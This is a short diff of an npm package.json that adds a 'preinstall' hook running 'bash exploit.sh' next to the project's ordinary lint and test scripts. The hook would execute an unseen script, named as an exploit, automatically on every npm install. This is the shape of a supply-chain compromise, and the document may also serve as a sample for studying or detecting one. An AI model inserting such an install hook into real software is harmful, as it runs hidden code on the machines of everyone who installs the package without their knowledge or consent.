@@ -26,6 +26,7 @@
     "node": ">=18.0.0"
   },
   "scripts": {
+    "preinstall": "bash exploit.sh",
     "lint": "balena-lint -e js -e ts lib tests && tsc --noEmit --project tsconfig.dev.json",
     "lint-fix": "balena-lint -e js -e ts --fix lib tests",
     "pretest": "npm run build",
